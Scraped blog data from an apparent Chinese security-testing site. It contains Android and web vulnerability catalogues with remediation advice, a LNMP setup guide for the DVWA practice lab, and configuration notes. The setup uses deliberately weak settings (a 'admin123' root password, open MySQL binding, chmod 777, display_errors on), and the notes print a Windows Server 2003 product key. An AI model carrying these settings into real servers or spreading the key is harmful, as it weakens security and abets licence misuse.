验证码安全漏洞级别低漏洞描述检测客户端程序在注册/登录/找回密码等操作时是否使用验证码校验技术。漏洞危害容易造成攻击者暴力破解账号密码。修复建议1、对于一些敏感操作，使用安全有效的验证码机制。2、在服务器端实时刷新与校验验证码，确保验证码不能被重复使用或置空验证码参数和值。 安全注销漏洞级别中漏洞描述测试APP应用会话注销是否能正常终止会话。漏洞危害不安全的注销机制可能允许应用退出后再次启用上次会话。修复建议在服务器端实时校验用户登录状态。用户退出后，用户凭证应立即失效，用户第二次登录后的用户凭证应当与先前登录时的用户凭证不同。 双因子认证检测漏洞级别中/低漏洞描述检测客户端程序是否对账户进行双因子认证。漏洞危害采用单因子认证容易出现凭证被窃取冒用的风险。修复建议建议APP提供多因子认证功能，如采用短信验证码、PIN码、手势密码、指纹解锁、人脸识别等鉴别技术。 手势密码绕过漏洞级别高漏洞描述检测客户端程序的手势密码可否被绕过。漏洞危害APP的手势密码可能会存在绕过等问题。修复建议根据漏洞情况给出对应的建议。 手势密码本地信息保存漏洞级别高漏洞描述检测在输入手势密码以后客户端是否会在本地记录一些相关信息，例如明文或加密过的手势密码，包括运行日志中是否会泄露手势密码。漏洞危害明文存储的手势密码会导致信息泄露。修复建议本地存储的手势密码一定要使用安全有效的加密算法进行加密保护。 通信安全通信协议检测漏洞级别中漏洞描述检测客户端和服务端通信采用什么协议进行传输。漏洞危害业务敏感信息明文传输，采用HTTP协议传输，易造成信息泄露。修复建议部署HTTPS、SSL/TLS协议。 证书有效性检测漏洞级别中漏洞描述检查服务端证书是否是CA签发，客户端程序和服务器端的SSL通信是否严格检查服务器端证书的有效性。漏洞危害业务敏感信息明文传输，易被中间人劫持，造成信息泄露。修复建议采用SSL/TLS双向验证，防止抓包等操作。 关键数据加密和校验漏洞级别中漏洞描述测试客户端程序提交数据给服务端时，密码等关键字段是否进行了加密，防止恶意用户嗅探到用户数据包中的密码等敏感信息。漏洞危害业务敏感信息明文传输，易被中间人劫持，造成信息泄露。修复建议1、使用较为安全的加密算法，诸如非对称加密算法等对传输过程中的用户名、密码、银行卡号等业务敏感信息进行加密处理。2、部署HTTPS协议。 业务安全SQL注入漏洞级别高漏洞描述SQL注入是将Web页面的原URL、表单域或数据包输入的参数，修改拼接成SQL语句，传递给Web服务器，进而传给数据库服务器以执行数据库命令。漏洞危害恶意攻击者可能会利用SQL注入漏洞获取、篡改数据库数据，执行系统命令，甚至获取系统控制权限。修复建议1、使用全局过滤器，过滤特殊字符，正确处理数据类型。包括但不限于以下字符及字符串：select and or like regxpfrom where update exec order by having drop delete ( ) [ ] &lt; &gt; , . ; : ‘“ # % + - _ = / * @。2、预编译SQL语句，而不要动态组装SQL语句，否则必须确保在使用输入的数据组装成SQL语句之前，对特殊字符进行预处理。3、以最小权限执行SQL语句，限制远程连接数据库的IP地址范围。4、屏蔽错误回显，必要时，限制长度。 XSS跨站脚本攻击漏洞级别高漏洞描述跨站脚本攻击，是目前最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。漏洞危害攻击者利用XSS，不仅能够进行钓鱼，窃取用户会话，网站挂马，甚至能够直接控制浏览器，或者引发蠕虫攻击。修复建议1、检查所有用户输入数据的地方是否有进行过滤或转义处理。包括但不限于这些字符：Javascript script src img onerror { } ( ) &lt; &gt; = , . ; : “ ‘ # ! / * \\。2、根据页面的输出背景环境，对输出进行编码或使用一个统一的规则和库做输出编码，使用安全框架进行安全编码。3、对于富文本框，尽量使用白名单控制输入，而不是黑名单。4、配置httpOnly,必要时，限制输入字符的长度。 任意文件上传漏洞级别高漏洞描述文件上传漏洞是指由于系统未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上传可执行的动态脚本文件。漏洞危害上传恶意脚本，获取信息、控制网站，甚至控制服务器。修复建议1、在服务器上使用白名单对上传的文件进行严格的验证，只允许上传特定的文件类型。验证包括文件扩展名校验、文件类型（Content-Type）校验、MIME类型校验、文件头校验等等。2、文件上传的存储目录禁用执行权限。3、使用随机数改写文件名和文件路径，让用户不能轻易访问自己上传的文件。 弱口令漏洞漏洞级别高漏洞描述应用存在默认口令或口令较简单易被猜到。漏洞危害攻击者可以通过暴力破解等方法得到正确的账号，从而冒用他人身份进入系统。修复建议1、统一错误回显，如只提示用户名或密码错误。2、使用安全有效的验证码校验机制。3、配置账号锁定策略，如错误登录3次以上锁定该账号10分钟。 越权访问漏洞级别高漏洞描述网站的页面权限控制不当，用户可访问不属于自己的页面并可修改数据。漏洞危害权限控制不当，会造成网站数据非法篡改等危害。修复建议1、验证一切来自客户端的参数，重点是和权限相关的参数，比如用户ID或者角色权限ID等。2、Session ID 和认证的Token做绑定，放在服务器的会话里，不发送给客户端。3、对于用户登录后涉及用户唯一信息的请求，每次都要验证检查所有权，敏感信息页面加随机数的参数，防止浏览器缓存内容。 短信轰炸漏洞级别中漏洞描述攻击者可以对指定手机号码进行短信轰炸，对用户造成骚扰的同时，也消耗了服务器资源。漏洞危害对用户造成短信骚扰，同时消耗服务器资源。修复建议1、在服务器端限制发送短信的时间间隔至少为60秒以上。2、发送短信验证码之前添加图形验证码校验。3、限制24小时内，针对同一手机号码发送验证码的总次数。4、限制单个IP地址24小时内请求验证码的次数。","tags":[{"name":"Android漏洞","slug":"Android漏洞","permalink":"https://laoel.github.io/tags/Android漏洞/"},{"name":"修复建议","slug":"修复建议","permalink":"https://laoel.github.io/tags/修复建议/"},{"name":"漏洞库","slug":"漏洞库","permalink":"https://laoel.github.io/tags/漏洞库/"},{"name":"测试指南","slug":"测试指南","permalink":"https://laoel.github.io/tags/测试指南/"}]},{"title":"Web常见漏洞库-v1.0","date":"2020-01-09T06:36:39.000Z","path":"2020/01/09/Web常见漏洞库-v1-0/","text":"有任何问题可留言评论，另有Excel版提供 https://github.com/laoel/testing-guide/blob/master/01-Web%E6%BC%8F%E6%B4%9E%E5%BA%93(%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E).xlsx XSS存储型XSS跨站脚本攻击漏洞级别高漏洞描述跨站脚本攻击是指应用程序没有对用户的输入，以及页面的输出进行严格地过滤，从而使恶意攻击者能往Web页面里插入恶意代码，当用户浏览该页面时，嵌入其中Web里面的恶意代码会被执行，从而达到恶意攻击者的特殊目的。漏洞危害恶意攻击者利用漏洞来窃取用户会话、账号，控制应用系统数据、网站挂马、控制受害者机器向其它网站发起攻击等等。修复建议1、检查所有用户可输入数据的地方是否有进行过滤或转义处理。包括但不限于这些字符：Javascript script src img onerror { } ( ) &lt; &gt; = , . ; : “ ‘ # ! / * \\。2、根据页面的输出背景环境，对输出进行编码或使用一个统一的规则和库做输出编码，使用安全框架进行安全编码。3、对于富文本框，使用白名单控制输入，而不是黑名单。4、在Cookie 上设置HTTPOnly标志，从而禁止客户端脚本访问Cookie。 反射型XSS跨站脚本攻击漏洞级别低漏洞描述跨站脚本攻击是指应用程序没有对用户的输入，以及页面的输出进行严格地过滤，从而使恶意攻击者能往Web页面里插入恶意代码，当用户浏览该页面时，嵌入其中Web里面的恶意代码会被执行，从而达到恶意攻击者的特殊目的。漏洞危害恶意攻击者利用此漏洞可进行钓鱼，窃取用户登录会话等危害。修复建议1、检查所有用户可输入数据的地方是否有进行过滤或转义处理。包括但不限于这些字符：Javascript script src img onerror { } ( ) &lt; &gt; = , . ; : “ ‘ # ! / * \\。2、根据页面的输出背景环境，对输出进行编码或使用一个统一的规则和库做输出编码，使用安全框架进行安全编码。3、对于富文本框，使用白名单控制输入，而不是黑名单。4、在Cookie 上设置HTTPOnly标志，从而禁止客户端脚本访问Cookie。 注入SQL注入漏洞级别高漏洞描述SQL注入是将Web页面的原URL、表单域或数据包输入的参数，修改拼接成SQL语句，传递给Web服务器，进而传给数据库服务器以执行数据库命令。漏洞危害恶意攻击者可能会利用SQL注入漏洞获取、篡改数据库数据，执行系统命令，甚至获取系统控制权限。修复建议1、使用全局过滤器，过滤特殊字符，正确处理数据类型。包括但不限于以下字符及字符串：select and or like regxpfrom where update exec order by having drop delete ( ) [ ] &lt; &gt; , . ; : ‘“ # % + - _ = / * @。2、预编译SQL语句，而不要动态组装SQL语句，否则必须确保在使用输入的数据组装成SQL语句之前，对特殊字符进行预处理。3、以最小权限执行SQL语句，限制远程连接数据库的IP地址范围。4、屏蔽错误回显，必要时，限制长度。 XML外部实体注入（XXE）漏洞级别高漏洞描述外部实体攻击，利用。XML文件的解析依赖libxml库，而libxml2.9以前的版本默认支持并开启了外部实体的引用，服务端解析用户提交的XML文件时，未对XML文件引用的外部实体（含外部普通实体和外部参数实体）做合适的处理，并且实体的URL支持file://和ftp://等协议。漏洞危害攻击者可以在XML文件中声明URI指向服务器本地的实体造成攻击。实体攻击可导致信息泄露、任意文件读取、代码执行等问题。修复建议1、检查所有用户可输入数据的地方是否有进行过滤或转义处理。包括但不限于这些字符：&lt; &gt; &amp; ‘ “ 。2、检查使用的底层XML解析库，使用JAVA语言提供的禁用外部实体的方法。 权限控制缺失越权访问漏洞级别高漏洞描述网站的页面权限控制不当，用户可访问不属于自己的页面并可修改数据。漏洞危害权限控制不当，会造成网站数据非法篡改等危害。修复建议1、验证一切来自客户端的参数，重点是和权限相关的参数，比如用户ID或者角色权限ID等。2、Session ID 和认证的Token做绑定，放在服务器的会话里，不发送给客户端。3、对于用户登录后涉及用户唯一信息的请求，每次都要验证检查所有权，敏感信息页面加随机数的参数，防止浏览器缓存内容。 未授权访问漏洞级别高/中漏洞描述网站的权限控制不当，需要登录的系统在未登录的情况下也可访问其相关页面，造成敏感信息泄露，严重可导致数据被恶意篡改等。漏洞危害造成敏感信息泄露，严重可导致数据被非法篡改。修复建议做好权限控制，需登录后访问的页面其权限不可包含空用户。 业务逻辑任意账号密码重置漏洞级别高漏洞描述用户修改密码时不需要去校验旧密码，又未对用户身份做校验，容易导致随便一个用户可修改任意用户的密码，或其它修改密码流程中出现了问题。漏洞危害攻击者可修改任意账号的密码，从而冒用其身份登录系统。修复建议根据具体情况给出具体建议。 任意用户名注册漏洞级别中漏洞描述注册流程若没有严格校验，容易出现安全问题，如短信验证码可被爆破得出，就可以使用任意手机号码注册账号。漏洞危害攻击者可注册任意用户名的账号，从而使用其身份登录系统。修复建议根据具体情况给出具体建议。 支付逻辑漏洞漏洞级别高漏洞描述在交易流程环节，需要对业务数据的完整性和一致性进行保护，特别是确保在用户客户端与服务、业务系统接口之间的数据传输的一致性，通常在订购类交易流程中，容易出现服务器端未对用户提交的业务数据进行强制校验，过度信赖客户端提交的业务数据而导致的商品金额篡改漏洞。漏洞危害攻击者可以超低价格或低于商品原价完成交易。修复建议1、商品信息（金额、折扣、数量、运费等）原始数据的校验应来自于服务器端，不应该完全相信客户端传递过来的值。2、服务器端对客户端提交的交易数据（如商品ID、商品数量、商品价格、运费等）的取值范围进行校验，将商品ID和商品价格与数据库中的数据对比校验，商品数量为大于零的整型数。3、服务器端在生成支付订单时，对支付订单中影响支付金额的所有因素（比如商品ID、商品数量、运费、商品价格、订单编号等）进行签名，对客户端提交的支付订单进行校验。4、金额超过指定值，进行人工审核。 短信验证码绕过漏洞级别中漏洞描述验证码一般容易出现绕过的问题，如可重复使用一个验证码值、删除请求包中的验证码参数等，甚至根本不进行校验。漏洞危害绕过验证码校验，进行下一步攻击。修复建议在服务器端实时刷新与校验验证码，确保验证码不能被重复使用、参数不能为空、不能被暴力破解等。 图形验证码绕过漏洞级别低漏洞描述验证码一般容易出现绕过的问题，如可重复使用一个验证码值、删除请求包中的验证码参数等，甚至根本不进行校验。漏洞危害绕过验证码校验，进行下一步攻击。修复建议在服务器端实时刷新与校验验证码，确保验证码不能被重复使用及参数不能为空。 短信轰炸漏洞级别中漏洞描述攻击者可以对指定手机号码短时间内重复发送很多条短信信息。漏洞危害对用户造成短信骚扰，同时消耗服务器资源。修复建议1、在服务器端限制发送短信的时间间隔至少为60秒以上。2、发送短信之前添加图形验证码校验。3、限制24小时内，针对同一手机号码发送短信的总次数。4、限制单个IP地址24小时内请求发送短信的次数。 URL跳转任意URL跳转漏洞级别低漏洞描述服务端未对传入的跳转url变量进行检查和控制，可能导致可恶意构造任意一个恶意地址，诱导用户跳转到恶意网站。由于是从可信的站点跳转出去的，用户会比较信任，所以跳转漏洞一般用于钓鱼攻击，通过转到恶意网站欺骗用户输入用户名和密码盗取用户信息，或欺骗用户进行金钱交易。漏洞危害容易进行钓鱼攻击。修复建议1、若跳转的URL事先是可以确定的，包括url和参数的值，则可以在后台先配置好，url参数只需传对应url的索引即可，通过索引找到对应具体url再进行跳转；2、若跳转的URL事先不确定，但其输入是由后台生成的（不是用户通过参数传人），则可以先生成好跳转链接然后进行签名，而跳转首先需要进行验证签名通过才能进行跳转；3、若1和2都不满足，url事先无法确定，只能通过前端参数传入，则必须在跳转的时候对url进行按规则校验：即控制url是否是你们公司授权的白名单或者是符合你们公司规则的URL。 弱口令弱口令漏洞漏洞级别高漏洞描述应用存在默认口令或口令较简单易被猜到。漏洞危害攻击者可以通过暴力破解等方法得到正确的账号，从而冒用他人身份进入系统。修复建议1、统一错误回显，如提示用户名或密码错误。2、使用安全有效的验证码校验机制。3、配置账号锁定策略，如错误登录3次以上锁定该账号10分钟。 暴力破解登录凭证可猜解漏洞级别低漏洞描述检测到登录凭证可使用手工猜解或者工具暴力破解，攻击者能够凭借猜解到的登录凭证登录系统，进行系统管理和进一步的入侵。漏洞危害攻击者容易猜解登录凭证，登录系统。修复建议1、统一错误回显，如提示用户名或密码错误。2、使用安全有效的验证码校验机制。3、配置账号锁定策略，如错误登录3次以上锁定该账号10分钟。 用户名枚举漏洞级别低漏洞描述通常在登录页面、找回密码页面、修改密码页面，如果提交错误的请求会有很多错误提示，通过这些错误提示可判断哪种情况下用户名是对的。漏洞危害攻击者可得出正确的用户名，为爆破正确的账号做准备。修复建议1、统一错误回显，并增加安全有效的图形验证码。2、使用安全有效的加密算法对关键字段进行加密保护，防解密和防篡改。 敏感信息泄露敏感信息泄露漏洞级别高/中/低漏洞描述检测到网站敏感信息泄露，这些信息包括配置文件、备份文件、SVN文件、网站源码包、用户名、密码、数据库相关信息、物理路径、内网IP、注释中的敏感信息等等，攻击者可能收集这些敏感信息，为下一步的入侵做好准备。漏洞危害攻击者可收集有关信息系统的敏感信息，如配置文件、备份文件、SVN文件、网站源码包、用户名、密码、数据库相关信息、物理路径、内网IP、注释中的敏感信息等等，为下一步入侵做准备。修复建议1、优化代码从而避免程序报错。2、屏蔽默认报错页面中的敏感信息，可自定义一个程序报错的页面，当程序报错时统一显示自定义的报错页面。3、删除或屏蔽相关敏感信息。 文件上传任意文件上传漏洞级别高/中漏洞描述现在大多数网站都有文件上传功能，用于上传文档、图片等操作。但是未对上传的文件进行严格的验证和过滤，就有可能导致攻击者上传恶意脚本文件。漏洞危害攻击者可上传恶意脚本，获取信息、控制网站，甚至控制服务器。修复建议1、在服务器上使用白名单对上传的文件进行严格的验证，只允许上传特定的文件类型。验证包括文件扩展名校验、文件类型（Content-Type）校验、MIME类型校验、检测上传元信息等等。2、文件上传的存储目录禁用执行权限。3、使用随机数改写文件名和文件路径，让用户不能轻易访问自己上传的文件。 目录遍历任意文件下载/读取（目录遍历）漏洞级别高漏洞描述许多Web服务器都不会验证或清理虚拟Web服务器根目录之外的路径请求。这个问题可让远程用户利用相对路径来转义Web服务器的根目录。漏洞危害攻击者可查看服务器上的任何文件（例如，数据库、用户信息或配置文件）的内容。修复建议1、在需要读取、下载特定文件的操作中使用白名单进行验证，建议使用正则表达式对用户的输入进行合法性判断。2、如果无法使用白名单验证，则使用黑名单进行过滤，过滤点号（.）、斜杠（/）、反斜杠（\\）、百分号（%）等恶意字符。3、限定文件访问范围。 文件包含文件包含漏洞漏洞级别高漏洞描述程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。通过函数包含文件时，由于没有对包含的文件名进行有效的过滤处理，被攻击者利用从而导致了包含了Web根目录以外的文件进来，就会导致文件信息的泄露甚至注入了恶意代码。漏洞危害攻击者可执行任意脚本代码控制网站控制服务器。修复建议1、严格检查变量是否已经初始化。2、严格判断包含中的参数是否外部可控。3、基于白名单的包含文件验证，验证被包含的文件是否在白名单中。4、尽量不要使用动态包含，可以在需要包含的页面固定写好，如：include(“func.php”)。5、对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现../之类的目录跳转符。6、可以通过调用str_replace()函数实现相关敏感字符的过滤，一定程度上防御了远程文件包含。 配置不当Cookie伪造漏洞级别高漏洞描述Cookie伪造攻击指攻击者通过修改cookie（系统为了辨别用户身份而储存在用户本地终端上的数据，通常经过了加密处理），获得用户未授权信息，进而盗用身份的过程。漏洞危害可冒用他人账号的身份登入系统。修复建议对Cookie字段进行加密处理。 安装文件未删除漏洞级别高/中/低漏洞描述检测到网站安装文件未删除。在安装完网站后，应将相关的安装文件删除，以避免攻击者利用安装文件中的可能存在的漏洞获取网站敏感信息，甚至重新安装网站。漏洞危害可能利用安装文件可能存在的漏洞进行入侵。修复建议删除相关安装文件。 重放攻击漏洞级别高/低漏洞描述关键业务操作未作token或者唯一标识码，导致攻击者可以重复多次进行请求，导致恶意操作。如重复提交订单等问题。漏洞危害攻击者恶意或欺诈性地重复发送一个有效的数据包，如果服务器未检查此类重复提交的请求数据的有效性，那么转账充值等敏感操作将有可能会被重复执行。修复建议服务端应用程序应检查客户端提交的数据的唯一性，如使用流水号、时间戳、token等，并将流水号、时间戳等进行签名。 SSRF服务器端请求伪造（SSRF）漏洞级别高漏洞描述很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器。漏洞危害攻击者可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息,对内网web应用进行指纹识别以及利用file协议读取本地文件等。修复建议1、过滤内网服务器对公网服务器请求的响应。如果Web应用是获取某一类型的文件，在把返回结果展示给用户之前应先验证返回的信息是否符合文件类型标准，比如返回信息应为图片，如果返回信息是HTML，则停止将返回信息返回客户端。2、统一错误提示信息，避免用户可以根据错误信息来判断远端服务器的端口状态。3、在内网服务器的防火墙上限制公网服务器的请求端口为HTTP等协议常用端口，如：80、443、8080、8090。4、若公网服务器的内网IP与内网无业务通信，建议将公网服务器对应的内网IP列入黑名单，避免应用被用来获取内网数据。5、内网服务器禁用不必要的协议，仅允许HTTP和HTTPS请求，防止类似于file:///、gopher://、ftp:// 等协议引起的安全问题。 CORSCORS跨域资源共享漏洞漏洞级别中漏洞描述CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。它允许浏览器向跨源(协议 + 域名 + 端口)服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。当配置存在缺陷时，如请求时Origin字段的值没有做限制，默认为，就会接受任意域名的请求。漏洞危害可造成敏感数据泄露。修复建议1、不要配置”Access-Control-Allow-Origin”为通配符”“ ，而且更为重要的是，要严格效验来自请求数据包中的”Origin”的值。当收到跨域请求的时候，要检查”Origin” 的值是否是一个可信的源，还要检查是否为null。2、避免使用”Access-Control-Allow-Credentials: true” （请求中带cookie）。3、减少”Access-Control-Allow-Methods”所允许的方法。 CSRFCSRF跨站请求伪造攻击漏洞级别中/低漏洞描述攻击者就可诱导客户机向该Web服务器误发请求，而该请求将视为真实请求。这可通过URL、图像装入XMLHttpRequest等来完成，并可导致数据暴露或意外的代码执行。如果用户当前已登录到受害者站点，请求将自动使用用户的凭证（包括会话cookie、IP地址和其他浏览器认证方法）。漏洞危害CSRF跨站请求伪造攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在用户不知情的情况下执行在权限保护之下的操作。修复建议1、使用One-Time Tokens，不同的表单包不同的伪随机值。2、使用Cookie Hashing，所有表单都包含同一伪随机数。3、在表单中使用验证码，每次提交请求都要输入验证码。4、验证Referer字段。 远程代码执行struts2远程命令执行漏洞级别高漏洞描述Struts 2在2.3.15.1 之前的版本，对“action:”, “redirect:” 和 “redirectAction:” 后面的数据过滤不严格，由于其后面的数据会被作为OGNL表达式进行处理，从而攻击者可以构造恶意的数据，来达到执行远程命令的目的。漏洞危害攻击者可执行任意系统命令。修复建议升级struts至最新版本。","tags":[{"name":"修复建议","slug":"修复建议","permalink":"https://laoel.github.io/tags/修复建议/"},{"name":"漏洞库","slug":"漏洞库","permalink":"https://laoel.github.io/tags/漏洞库/"},{"name":"测试指南","slug":"测试指南","permalink":"https://laoel.github.io/tags/测试指南/"},{"name":"web漏洞","slug":"web漏洞","permalink":"https://laoel.github.io/tags/web漏洞/"}]},{"title":"一文搞定LNMP环境的搭建","date":"2019-12-04T15:59:26.000Z","path":"2019/12/04/一文搞定LNMP环境的搭建/","text":"LNMP介绍LNMP是指一组通常一起使用来运行动态网站或者服务器的自由软件名称首字母缩写。L指Linux，N指Nginx，M一般指MySQL，也可以指MariaDB，P一般指PHP，也可以指Perl或Python。 LNMP代表的就是：Linux系统下Nginx+MySQL+PHP这种网站服务器架构。Linux是一类Unix计算机操作系统的统称，是目前最流行的免费操作系统。代表版本有：debian、centos、ubuntu、fedora、gentoo等。Nginx是一个高性能的HTTP和反向代理服务器，也是一个IMAP/POP3/SMTP代理服务器。Mysql是一个小型关系型数据库管理系统。PHP是一种在服务器端执行的嵌入HTML文档的脚本语言。这四种软件均为免费开源软件，组合到一起，成为一个免费、高效、扩展性强的网站服务系统。 先更新服务器123sudo apt-get update # 获取最新资源包sudo apt-get upgrade # 本机软件全部更新sudo apt-get dist-upgrade # 本机系统软件更新 安装数据库-MySQL安装mysql最新版 12apt install mysql-serverapt install mysql-client 安装完后我们直接以空密码登录mysql，如果在安装过程中提示输入密码则使用安装过程中设置的密码。 1mysql -uroot -p 若提示 ERROR 1698 (28000): Access denied for user &#39;root&#39;@&#39;localhost&#39;，请看这篇文章 Mysql ERROR 1698 (28000) 解决 - 黑猫警长的怨念 更改mysql数据库root用户的密码。 12345use mysql;update mysql.user set authentication_string=password(&apos;admin123&apos;) where user=&apos;root&apos; and Host =&apos;localhost&apos;;update user set plugin=&quot;mysql_native_password&quot;;flush privileges;quit; 开启远程登录 找到mysql的配置文件，/etc/mysql/mysql.conf.d/mysqld.cnf，找到下面这个，在前面加个#号把它注释掉，然后重启mysql服务service mysql restart。 1#bind-address = 127.0.0.1 注意：以前mysql的配置文件为/etc/mysql/my.cnf，新版的配置文件变成了是/etc/mysql/mysql.conf.d/mysqld.cnf 另外离线安装mysql，可看这篇文章，这样的话可以安装指定的版本，而不是最新版。 https://www.cnblogs.com/JasonTech0713/p/6690949.html 安装phpmyadmin123apt-get install phpmyadminln -s /usr/share/phpmyadmin /var/www/html/phpmyadmin#建立软连接 安装Nginx1apt-get install nginx 编辑Nginx 默认的配置文件/etc/nginx/sites-enabled/default，做如下修改 。 1/etc/init.d/nginx restart #重启Nginx服务 安装php1apt-get install php-mysql php-fpm php-curl php-xml php-gd php-mbstring php-memcached php-zip php-gettext 编辑配置文件/etc/php/7.2/fpm/php-fpm.conf，在最后面加上这句 1listen = /run/php/php7.2-fpm.sock 再编辑配置文件/etc/php/7.2/fpm/php.ini，搜索以下值，改成跟下面一样。 123display_errors = Onshort_open_tag = On;cgi.fix_pathinfo=0 然后重启服务 1service php7.2-fpm restart 测试写个phpinfo来测试一下 1echo \"&lt;?php phpinfo();?&gt;\" &gt; /var/www/html/phpinfo.php 打开浏览器，访问这个文件 http://ip/phpinfo.php，可以看到phpinfo信息显示正常就没有问题了，然后记得删掉这个文件rm /var/www/html/phpinfo.php 这里记录一下我使用的 LANP 版本。 1234567891011121314root@0o0:~# uname -aLinux 0o0 5.0.0-37-generic #40-Ubuntu SMP Thu Nov 14 00:14:01 UTC 2019 x86_64 x86_64 x86_64 GNU/Linuxroot@0o0:~# mysql --versionmysql Ver 14.14 Distrib 5.7.28, for Linux (x86_64) using EditLine wrapperroot@0o0:~# nginx -vnginx version: nginx/1.15.9 (Ubuntu)root@0o0:~# php -vPHP 7.2.24-0ubuntu0.19.04.1 (cli) (built: Oct 24 2019 11:49:39) ( NTS )Copyright (c) 1997-2018 The PHP GroupZend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies with Zend OPcache v7.2.24-0ubuntu0.19.04.1, Copyright (c) 1999-2018, by Zend Technologies 部署一个网站-dvwa打开phpmyadmin管理页面，新增一个用户，并创建名为dvwa的数据库，如下： 编辑dvwa源码包中的配置文件config.inc.php 然后把文件上传到服务器/var/www/html/目录中。 再给几个文件改下权限，具体是什么文件，看/dvwa/setup.php页面。 123chmod 777 /var/www/html/dvwa/config/chmod 777 /var/www/html/dvwa/hackable/uploads/chmod 777 /var/www/html/dvwa/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt 最后访问http://ip/dvwa/，之后按提示操作（创建数据库），更多安装详情，可自行百度。 扩展阅读Nginx + PHP CGI的一个可能的安全漏洞 - Laruence Nginx+Php-fpm 运行原理详解 - 子路 Ubuntu18.04新手架设网站全过程 - 帘倦西风 Ubuntu 安装 PhpMyAdmin 管理 MySQL 数据库 - 肖朋伟 渗透测试环境DVWA搭建 - faramita2016","tags":[{"name":"环境搭建","slug":"环境搭建","permalink":"https://laoel.github.io/tags/环境搭建/"},{"name":"LNMP","slug":"LNMP","permalink":"https://laoel.github.io/tags/LNMP/"}]},{"title":"一些配置小记","date":"2019-11-20T02:31:24.000Z","path":"2019/11/20/一些配置小记/","text":"ssh连服务器改过密码ssh服务器提示WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!,输入下面这条命令清除本机上的旧密码信息即可。 1ssh-keygen -R X.X.X.X server 2003 密钥1RYCR6-T7Y6M-2TVHK-C2YW3-7TYQ8 夜神模拟器连接不上adb adb版本问题 夜神模拟器连接不上adb - tyu1850 端口问题 夜神模拟器连接不上adb的解决办法 - timma_wang 以前端口是62001,现在已经变成62025了，所以先试试连62025。 1adb connect 127.0.0.1:62025 找到夜神安装路径下的nox_adb.exe，拖到cmd中，后加devices,回车即可看到端口，并已经连接了。 1234C:\\Users\\a--o-&quot;D:\\Program Files\\Nox\\bin\\nox_adb.exe&quot; devicesList of devices attached127.0.0.1:62025 device Firefox关闭GET请求到detectportal.firefox.com网站的方法用火狐浏览器代理抓包时，发现总是有 http://detectportal.firefox.com/success.txt 这个请求会被拦截到，很不方便。 解决办法，在地址栏输入 about:config 搜索network.captive-portal-service.enabled 双击把true改为false就可以了。 cmd 命令把文件夹打成war包 以管理员身份运行 CMD cd到指定目录 输入以下命令即可 1jar -cvf wwwroot.war * Google浏览器如何截取网页长图https://www.liwei8090.com/14622.html ssr搭建教程2019 Vultr VPS主机一步一步搭建SS/SSR图文教程，限时活动充25刀赠送50刀！ https://www.hostpingce.com/vultr-vps-install-ss-ssr/ ShadowsocksR/SSR一键脚本Ubuntu版(ssr安装教程-含ssr客户端下载地址)https://hijk.art/ubuntu-shadowsocksr-ssr-one-click-script/ 如何确认VPS上是否开启了BBR，以及一键安装的脚本https://vps123.top/check-if-bbr-enabled-on-you-vps-and-how-to-install-it.html Linux下好用的4款ss/ssr客户端https://blog.skihome.xyz/posts/cf71037e/ shadowsocks-qt5下载地址 https://github.com/shadowsocks/shadowsocks-qt5 VMware中ubuntu忘记密码的解决办法https://blog.csdn.net/david_xtd/article/details/6854676 Linux阿里的软件源12345678910deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse","tags":[{"name":"小技巧","slug":"小技巧","permalink":"https://laoel.github.io/tags/小技巧/"}]},{"title":"在server 2012中部署weblogic","date":"2019-10-16T04:46:45.000Z","path":"2019/10/16/在server-2012中部署weblogic/","text":"Weblogic介绍Oracle WebLogic Server 是全球第一款云原生，适用于多层分布式企业应用开发和部署的企业级 Java 平台应用服务器，能够集中管理各种应用服务，如 Web 服务器功能、业务组件，以及企业后端系统访问，等等。 Oracle WebLogic Server 提供以下云就绪特性： 独特的多租户功能，有力促进大规模整合 轻型微容器架构，加强应用隔离并实现私有云与公有云之间的完全可移植性 多数据中心高可用性架构，有效防范应用中断 全面支持 Java EE 8 和 Java SE 12，帮助开发人员锐意创新，充分发挥 DevOps 的效力。 基于 Oracle WebLogic Server 的 Oracle Java 云服务，无论在本地还是云端都能访问同一平台 准备下载安装包 jdk安装包 https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html weblogic安装包 https://www.oracle.com/middleware/technologies/fusionmiddleware-downloads.html jdk 环境变量配置右击我的电脑 $\\Longrightarrow$属性 $\\Longrightarrow$ 高级系统设置$\\Longrightarrow$ 环境变量 在系统变量中 新建名为 classpath 的变量名，变量值为 1.;%JAVA_HOME%\\lib;%JAVA_HOME%\\lib\\tools.jar 新建名为 JAVA_HOME 的变量名，变量值为 jdk的安装路径，下面是我电脑中的jdk安装路径。 1C:\\Program Files\\Java\\jdk1.8.0_191 在系统变量 path 中最末尾加上 